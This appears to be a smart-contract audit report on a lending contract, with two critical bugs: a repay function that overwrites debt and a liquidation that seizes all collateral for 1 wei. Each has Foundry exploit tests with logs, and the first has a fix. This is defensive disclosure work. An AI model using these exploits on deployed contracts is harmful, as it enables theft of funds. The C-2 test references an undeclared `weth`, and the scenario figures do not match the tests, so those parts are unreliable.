## CRITICAL

### [C-1] Incorrect Logic in `CollateralBorrowBank::repay`, Causing Protocol Get Drained Overtime 

**Description:** Incorrect logic implementation in `CollateralBorrowBank::repay` enabling borrower to repay debt with invalid amount of assets. Instead of subtracting it with the `msg.value`, `repay` just changing the `debtOf[msg.sender]` with the value that user's sent.

```js
    function repay() external payable {
        require(msg.value > 0, "Zero");
        require(debtOf[msg.sender] >= msg.value, "Too much");
@>      debtOf[msg.sender] = msg.value;
    }
```

**Impact:** Protocol can get drained by this issues.

**Proof of Concept:**
1. User deposit collateral, 10 ETH
2. User borrow 5 ETH
3. User repay with tiny amount of wei, ex 1 wei
4. The debt changing from 5 ETH to 1 wei
5. +- 4,99e18 got stolen from the protocol

To do the test we need to create some Mock contract to do the test, you can place it in the same file in `CollateralBorrowBank.t.sol`.

1. MockERC20

<details>
<summary>Code</summary>

```js
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
```
</details>

2. MockOracle

<details>
<summary>Code</summary>

```js
contract MockOracle {
    uint256 public price;
    uint8 public feedDecimals;

    constructor(uint256 _price, uint8 _decimals) {
        price = _price;
        feedDecimals = _decimals;
    }

    function latestPrice() external view returns (uint256) {
        return price;
    }

    function decimals() external view returns (uint8) {
        return feedDecimals;
    }

    function setPrice(uint256 p) external {
        price = p;
    }
}
```
</details>

3. CollateralBorrowBankTest

<details>
<summary>Code</summary>

```js
contract CollateralBorrowBankTest is Test {
    MockERC20 token;
    MockOracle oracle;
    CollateralBorrowBank bank;

    address alice = address(0xA11CE);
    address liquidator = address(0xB100D8);

    function setUp() public {
        token = new MockERC20();
        oracle = new MockOracle(1e18, 18);
        bank = new CollateralBorrowBank(IERC20(address(token)), IPriceOracle(address(oracle)));

        // fund bank with ETH so borrow() can transfer out
        vm.deal(address(bank), 1000 ether);

        // prepare alice
        token.mint(alice, 10 ether);
        vm.startPrank(alice);
        token.approve(address(bank), type(uint256).max);
        vm.stopPrank();
    }

    function test_repayIssue() public {
        // deposit
        vm.startPrank(alice);
        bank.depositCollateral(1 ether);
        uint256 maxBorrow = bank.maxBorrow(alice);
        uint256 expected = (1 ether * oracle.latestPrice() * bank.LTV_BPS()) / bank.BPS();
        assertEq(maxBorrow, expected);

        // borrow
        uint256 borrowAmt = expected / 2;
        uint256 aliceBalanceBefore = address(alice).balance;
        bank.borrow(borrowAmt);
        uint256 aliceBalanceAfter = address(alice).balance;
        assertEq(aliceBalanceAfter - aliceBalanceBefore, borrowAmt);
        assertEq(bank.debtOf(alice), borrowAmt);

        // repay
        uint256 repayAmt = 1;
        bank.repay{value: repayAmt}();
        assertEq(bank.debtOf(alice), repayAmt);

        // withdraw collateral
        uint256 collateralAmt = 1 ether - 1;
        bank.withdrawCollateral(collateralAmt);

        console.log("Balance before borrow: %e", aliceBalanceBefore);
        console.log("Balance after borrow: %e", aliceBalanceAfter);
        console.log("Borrowed: %e", borrowAmt);
        console.log("Repaid: %e", repayAmt);
        console.log("Balance total after withdraw collateral: %e", address(alice).balance);

        vm.stopPrank();
    }
```
</details>

```js
Logs:
  Balance before borrow: 0e0
  Balance after borrow: 2.5e20
  Borrowed: 2.5e20
  Repaid: 1e0
  Balance total after withdraw collateral: 2.49999999999999999999e20
```

**Recommended Mitigation:** 
Instead of changing the value of debtOf[msg.sender] with the msg.value, use msg.value to substract the original user's debt. The code should look like below:

```diff
    function repay() external payable {
        require(msg.value > 0, "Zero");
        require(debtOf[msg.sender] >= msg.value, "Too much");
+       debtOf[msg.sender] -= msg.value;
-       debtOf[msg.sender] = msg.value;
    }
```

### [C-2] `CollateralBorrowBank::liquidate` enables liquidator to claim all collaterized asset with a tiny amount of ether, causing loss of funds in protocol

**Description:** `CollateralBorrowBank::liquidate` enables liquidator to claim all collaterized asset for undercollaterized user with a tiny amount of ether, causing loss of funds in protocol. 

```js
function liquidate(address user) external payable {
        require(debtOf[user] > maxBorrow(user), "Healthy");
        require(msg.value > 0, "Zero repay");
        require(msg.value <= debtOf[user], "Too much");

        debtOf[user] -= msg.value;

        uint256 seized = collateralOf[user];
        collateralOf[user] = 0;
        require(collateralToken.transfer(msg.sender, seized), "Transfer failed");
    }
```

**Impact:** Loss of funds in protocol

**Proof of Concept:**

1. User B borrow 5 ETH and collaterized 10 TokenA
2. Price of TokenA drops 90%, so the value is less than 5 ETH
3. User A spot unhealthy account
4. User A call `liquidate(User B)` with msg.value == 1 wei
5. User A get all of the collaterized token of the User B

To do the test we need to create some Mock contract to do the test, you can place it in the same file in `CollateralBorrowBank.t.sol`.

1. MockERC20

<details>
<summary>Code</summary>

```js
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
```
</details>

2. MockOracle

<details>
<summary>Code</summary>

```js
contract MockOracle {
    uint256 public price;
    uint8 public feedDecimals;

    constructor(uint256 _price, uint8 _decimals) {
        price = _price;
        feedDecimals = _decimals;
    }

    function latestPrice() external view returns (uint256) {
        return price;
    }

    function decimals() external view returns (uint8) {
        return feedDecimals;
    }

    function setPrice(uint256 p) external {
        price = p;
    }
}
```
</details>

3. CollateralBorrowBankTest

<details>
<summary>Code</summary>

```js
contract CollateralBorrowBankTest is Test {
    MockERC20 token;
    MockOracle oracle;
    CollateralBorrowBank bank;

    address alice = address(0xA11CE);
    address liquidator = address(0xB100D8);

    function setUp() public {
        token = new MockERC20();
        oracle = new MockOracle(1e18, 18);
        bank = new CollateralBorrowBank(IERC20(address(token)), IPriceOracle(address(oracle)));

        // fund bank with ETH so borrow() can transfer out
        vm.deal(address(bank), 1000 ether);

        // prepare alice
        token.mint(alice, 10 ether);
        vm.startPrank(alice);
        token.approve(address(bank), type(uint256).max);
        vm.stopPrank();
    }

    function test_tiny_liquidation_seizes_all() public {
        // deposit
        vm.startPrank(alice);
        bank.depositCollateral(1 ether);
        uint256 maxBorrow = bank.maxBorrow(alice);
        uint256 expected = (1 ether * oracle.latestPrice() * bank.LTV_BPS()) / bank.BPS();
        assertEq(maxBorrow, expected);

        // borrow
        uint256 borrowAmt = expected / 2;
        uint256 aliceBalanceBefore = address(alice).balance;
        bank.borrow(borrowAmt);
        uint256 aliceBalanceAfter = address(alice).balance;
        assertEq(aliceBalanceAfter - aliceBalanceBefore, borrowAmt);
        assertEq(bank.debtOf(alice), borrowAmt);
        vm.stopPrank();

        // manipulate price to make alice undercollateralized
        oracle.setPrice(0);

        // liquidator provides tiny repayment and should receive all collateral under current logic
        vm.deal(liquidator, 1);
        uint256 liquidatorBalanceBefore = weth.balanceOf(liquidator);
        vm.prank(liquidator);
        bank.liquidate{value: 1}(alice);
        uint256 liquidatorBalanceAfter = weth.balanceOf(liquidator);

        console.log("Balance of liquidator before: %e", liquidatorBalanceBefore);
        console.log("Balance of liquidator after: %e", liquidatorBalanceAfter);
        // liquidator receives the entire collateral balance
        assertEq(weth.balanceOf(liquidator), 1 ether);
        // debt reduced by the small amount
        assertEq(bank.debtOf(alice), borrowAmt - 1);
    }
}
```
</details>

run `forge test --mt test_tiny_liquidation_seizes_all -vvvv"` to test it! You will see logs like below, it indicates that the liquidator have succesfully liquidate the User A collaterized token with only 1 wei of native ETH.

```js
Logs:
  Balance of liquidator before: 0e0
  Balance of liquidator after: 1e18
```



